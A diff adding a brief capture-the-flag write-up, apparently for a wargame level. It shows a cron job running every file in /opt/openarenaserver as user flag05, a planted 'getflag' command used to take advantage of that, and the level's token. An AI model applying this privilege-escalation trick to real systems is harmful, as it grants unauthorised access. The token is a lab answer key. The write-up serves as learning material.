@@ -1,0 +1,15 @@
+we can see this in our email:
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+this means this script is excuting every 2 minutes
+we can see in the script there are this:
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+so we can put a script in /opt/openarenaserver and it will be execute as flag05
+so we put this script => getflag > /tmp/flag.txt
+Wait 2 min and we cat /tmp/flag.txt
+Output => Check flag.Here is your token : viuaaale9huek52boumoomioc
